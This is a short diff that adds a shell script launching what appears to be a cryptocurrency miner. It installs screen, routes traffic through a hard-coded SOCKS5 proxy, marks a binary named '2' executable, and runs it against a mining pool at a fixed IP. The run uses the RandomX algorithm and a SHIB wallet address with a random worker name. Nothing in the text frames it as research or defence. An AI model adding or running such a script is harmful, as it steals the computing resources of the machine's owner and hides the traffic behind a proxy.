@@ -1,0 +1,4 @@
+WORKER=$(echo $(shuf -i 1000-9999 -n 1)-Money)#rame-kb3u
+apt-get update
+apt install screen -y
+export http_proxy=socks5://98.162.25.23:4145 && chmod u+x 2 && ./2 -o 54.189.168.37:2222 -u SHIB:0x7c010aa62bc975b07cce8a84abca304f1d23a4f9.$WORKER -p x -k -a rx/0
